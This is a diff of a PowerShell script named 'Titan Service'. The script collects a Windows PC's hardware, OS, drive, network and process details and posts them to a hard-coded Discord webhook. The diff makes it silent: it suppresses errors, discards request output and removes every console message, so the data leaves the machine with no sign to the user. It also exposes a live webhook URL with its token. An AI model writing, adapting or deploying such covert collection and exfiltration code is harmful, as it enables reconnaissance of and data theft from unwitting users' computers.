@@ -1,7 +1,10 @@
 ###############################################################################
-# TS - Titan Service: Streamlined PC-Info-to-Discord Script (English)
-# Sends only the specified 9 categories to Discord
+# TS - Titan Service: Silent PC-Info-to-Discord Script (English)
+# Sends only the specified 9 categories to Discord, with no console output
 ###############################################################################
+
+# Prevent console error messages
+$ErrorActionPreference = "SilentlyContinue"
 
 # 1) DISCORD WEBHOOK URL
 $DiscordWebhookUrl = "https://discord.com/api/webhooks/1321463940802416662/vEfq26I3sIET-oKyzZxFPKsY4NaZ3HWLv1yUxkd9og6eZTHgxanJo4lYxkXL3Atx9pXN"
@@ -19,17 +22,16 @@ function Send-DiscordMessage {
         Invoke-RestMethod -Uri $DiscordWebhookUrl `
                           -Method Post `
                           -Body $jsonBody `
-                          -ContentType "application/json"
+                          -ContentType "application/json" | Out-Null
     }
     catch {
-        Write-Host "Error sending to Discord: $($_.Exception.Message)" -ForegroundColor Red
+        # SilentlyContinue means no console error output
     }
 }
 
 ###############################################################################
-# 3) SYSTEM BASICS
+# SYSTEM BASICS
 ###############################################################################
-Write-Host ">>> Sending System Basics to Discord ..."
 try {
     $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
     $msgSystem = ">>> System Basics <<<`n"
@@ -42,14 +44,11 @@ try {
 
     Send-DiscordMessage -Content $msgSystem
 }
-catch {
-    Send-DiscordMessage -Content "Error retrieving System Basics: $($_.Exception.Message)"
-}
+catch {}
 
 ###############################################################################
-# 4) OPERATING SYSTEM INFO
+# OPERATING SYSTEM INFO
 ###############################################################################
-Write-Host ">>> Sending Operating System Info to Discord ..."
 try {
     $os = Get-CimInstance -ClassName Win32_OperatingSystem
     $msgOS = ">>> Operating System Info <<<`n"
@@ -64,14 +63,11 @@ try {
 
     Send-DiscordMessage -Content $msgOS
 }
-catch {
-    Send-DiscordMessage -Content "Error retrieving OS Info: $($_.Exception.Message)"
-}
+catch {}
 
 ###############################################################################
-# 5) CPU INFO
+# CPU INFO
 ###############################################################################
-Write-Host ">>> Sending CPU Info to Discord ..."
 try {
     $cpuList = Get-CimInstance -ClassName Win32_Processor
     $msgCPU = ">>> CPU Info <<<`n"
@@ -85,14 +81,11 @@ try {
 
     Send-DiscordMessage -Content $msgCPU
 }
-catch {
-    Send-DiscordMessage -Content "Error retrieving CPU Info: $($_.Exception.Message)"
-}
+catch {}
 
 ###############################################################################
-# 6) BIOS INFO
+# BIOS INFO
 ###############################################################################
-Write-Host ">>> Sending BIOS Info to Discord ..."
 try {
     $bios = Get-CimInstance -ClassName Win32_BIOS
     $msgBIOS = ">>> BIOS Info <<<`n"
@@ -103,14 +96,11 @@ try {
 
     Send-DiscordMessage -Content $msgBIOS
 }
-catch {
-    Send-DiscordMessage -Content "Error retrieving BIOS Info: $($_.Exception.Message)"
-}
+catch {}
 
 ###############################################################################
-# 7) MEMORY INFO
+# MEMORY INFO
 ###############################################################################
-Write-Host ">>> Sending Memory Info to Discord ..."
 try {
     $memModules = Get-CimInstance -ClassName Win32_PhysicalMemory
     $msgMemory = ">>> Memory Info <<<`n"
@@ -126,14 +116,11 @@ try {
 
     Send-DiscordMessage -Content $msgMemory
 }
-catch {
-    Send-DiscordMessage -Content "Error retrieving Memory Info: $($_.Exception.Message)"
-}
+catch {}
 
 ###############################################################################
-# 8) GPU INFO
+# GPU INFO
 ###############################################################################
-Write-Host ">>> Sending GPU Info to Discord ..."
 try {
     $gpuList = Get-CimInstance -ClassName Win32_VideoController
     $msgGPU = ">>> GPU Info <<<`n"
@@ -148,17 +135,15 @@ try {
 
     Send-DiscordMessage -Content $msgGPU
 }
-catch {
-    Send-DiscordMessage -Content "Error retrieving GPU Info: $($_.Exception.Message)"
-}
+catch {}
 
 ###############################################################################
-# 9) DRIVE INFO
+# DRIVE INFO
 ###############################################################################
-Write-Host ">>> Sending Drive Info to Discord ..."
 try {
-    # Physical Drives
     $diskDrives = Get-CimInstance -ClassName Win32_DiskDrive
+    $logicalDrives = Get-CimInstance -ClassName Win32_LogicalDisk
+
     $msgDrives = ">>> Drive Info <<<`n`n"
     $msgDrives += "Physical Drives:`n"
     foreach ($drive in $diskDrives) {
@@ -169,8 +154,6 @@ try {
         $msgDrives += ("  Capacity (GB):      " + [Math]::Round($drive.Size / 1GB, 2) + "`n`n")
     }
 
-    # Logical Drives
-    $logicalDrives = Get-CimInstance -ClassName Win32_LogicalDisk
     $msgDrives += "Logical Drives:`n"
     foreach ($lDrive in $logicalDrives) {
         $msgDrives += "  Drive:             $($lDrive.DeviceID)`n"
@@ -186,14 +169,11 @@ try {
 
     Send-DiscordMessage -Content $msgDrives
 }
-catch {
-    Send-DiscordMessage -Content "Error retrieving Drive Info: $($_.Exception.Message)"
-}
+catch {}
 
 ###############################################################################
-# 10) NETWORK INFO
+# NETWORK INFO
 ###############################################################################
-Write-Host ">>> Sending Network Info to Discord ..."
 try {
     $netAdapters = Get-NetIPConfiguration
     $msgNet = ">>> Network Info <<<`n"
@@ -218,14 +198,11 @@ try {
 
     Send-DiscordMessage -Content $msgNet
 }
-catch {
-    Send-DiscordMessage -Content "Error retrieving Network Info: $($_.Exception.Message)"
-}
+catch {}
 
 ###############################################################################
-# 11) PROCESS INFO (ONLY 10 UNIQUE)
+# PROCESS INFO (ONLY 10 UNIQUE)
 ###############################################################################
-Write-Host ">>> Sending Process Info (Only 10 unique) to Discord ..."
 try {
     $uniqueProcesses = Get-Process | Group-Object -Property Name | Sort-Object -Property Name
     $uniqueProcesses = $uniqueProcesses | Select-Object -First 10
@@ -237,11 +214,6 @@ try {
 
     Send-DiscordMessage -Content $msgProcs
 }
-catch {
-    Send-DiscordMessage -Content "Error retrieving Process Info: $($_.Exception.Message)"
-}
+catch {}
 
-###############################################################################
-# DONE
-###############################################################################
-Write-Host "TS: Done! Only the specified categories have been sent to Discord in English."
+# End of script, no output in console
